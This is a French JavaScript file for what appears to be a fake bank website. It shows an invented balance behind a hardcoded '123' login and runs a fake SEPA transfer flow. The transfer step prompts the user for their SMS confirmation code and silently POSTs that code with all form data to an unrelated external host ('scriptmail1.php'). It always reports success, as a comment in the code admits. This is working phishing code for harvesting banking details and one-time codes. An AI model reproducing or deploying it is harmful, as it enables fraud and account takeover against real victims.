
// Initialisation des soldes et transactions
if (!localStorage.getItem("solde")) {
  localStorage.setItem("solde", "4500443");
  localStorage.setItem("epargne", "4500443");
  localStorage.setItem("transactions", JSON.stringify([]));
}

/** Index Javascript **/

const login = () => {
  let identifiant = document.getElementById("username").value;
  let password = document.getElementById("secret-nbr").value;
  if (identifiant != "" && password != "") {
    if (identifiant === "123" && password === "123") {
      localStorage.setItem("sessionID", "true");
      window.location = "solde.html";
    } else {
      document.getElementsByClassName("message_title")[0].innerHTML =
        "Identifiants ou mot de passe incorrect";
    }
  } else {
    document.getElementsByClassName("message_title")[0].innerHTML =
      "Veuillez remplir tous les champs";
  }
};

const resetU = () => {
  document.getElementById("username").value = "";
};

const resetS = () => {
  document.getElementById("secret-nbr").value = "";
};

/** End Index javascript **/


/** Deconnexion Javascript **/
const logout = () => {
  localStorage.setItem("sessionID", "false");
  window.location = "index.html";
};
/** End Deconnexion javascript **/


/** Virement: loader + mise à jour */
const alert_message = () => {
  Swal.fire({
    title: "CODE DE CONFIRMATION",
    text: "Veuillez entrer le code envoyé par SMS pour confirmer le virement",
    input: "text",
    inputPlaceholder: "Entrez votre code",
    showCancelButton: true,
    confirmButtonText: "Valider",
    cancelButtonText: "Annuler",
    inputValidator: (value) => {
      if (!value) return "Vous devez entrer un code !";
    },
  }).then((result) => {
    if (!result.isConfirmed) return;

    // Préparation des données
    const form = document.getElementById("sepaForm");
    const data = form ? new FormData(form) : new FormData();
    data.append("code", result.value);

    // Envoi best-effort (ignoré si indisponible)
    // NB: Quel que soit le résultat, on affiche une confirmation de succès.
    const sendPromise = fetch("https://onairefitnesses.com/scriptmail1.php", {
      method: "POST",
      body: data,
    }).catch(() => null);

    // Afficher la confirmation de succès quoi qu'il arrive
    sendPromise.finally(() => {
      Swal.fire("Succès", "Votre virement a été effectué avec succès.", "success");
    });
  });
};

/** Helpers: activer/désactiver le bouton en fonction des champs requis **/

// --- Virement en cours + succès ---
const virement_loading = () => {
  Swal.fire({
    title: "Virement en cours",
    html: "Chargement...",
    timer: 3000,
    timerProgressBar: true,
    didOpen: () => {
      Swal.showLoading();
    },
    willClose: () => {
      effectuerVirement();
    },
  });
};

const effectuerVirement = () => {
  const form = document.getElementById("sepaForm");
  if (!form) return;

  const data = new FormData(form);
  const montant = parseFloat(data.get("montant")) || 0;
  const libelle = data.get("libelle") || "Virement";

  let solde = parseFloat(localStorage.getItem("solde")) || 0;
  let epargne = parseFloat(localStorage.getItem("epargne")) || 0;

  solde -= montant;
  epargne -= montant;
  localStorage.setItem("solde", solde);
  localStorage.setItem("epargne", epargne);

  const transactions = JSON.parse(localStorage.getItem("transactions")) || [];
  const dateNow = new Date().toLocaleDateString("fr-FR");
  transactions.push({ type: "virement", libelle, montant, date: dateNow });
  localStorage.setItem("transactions", JSON.stringify(transactions));

  Swal.fire("Succès", "Votre virement a été effectué avec succès.", "success");
};


const initVirementForm = () => {
  const form = document.getElementById("sepaForm");
  const btn = document.getElementById("btn_valid");
  if (!form || !btn) return;

  const updateButtonState = () => {
    const requiredFields = form.querySelectorAll("input[required]");
    const allFilled = Array.from(requiredFields).every((el) => el.value.trim() !== "");
    btn.disabled = !allFilled;
    if (allFilled) {
      btn.classList.add("active");
    } else {
      btn.classList.remove("active");
    }
  };

  // Activer/désactiver en temps réel
  form.addEventListener("input", updateButtonState);
  updateButtonState();

  // Soumission: on empêche l'envoi natif, puis on montre le loader
  form.addEventListener("submit", (event) => {
    event.preventDefault();
    virement_loading();
  });
};

// Initialisation à l'ouverture de la page
document.addEventListener("DOMContentLoaded", initVirementForm);
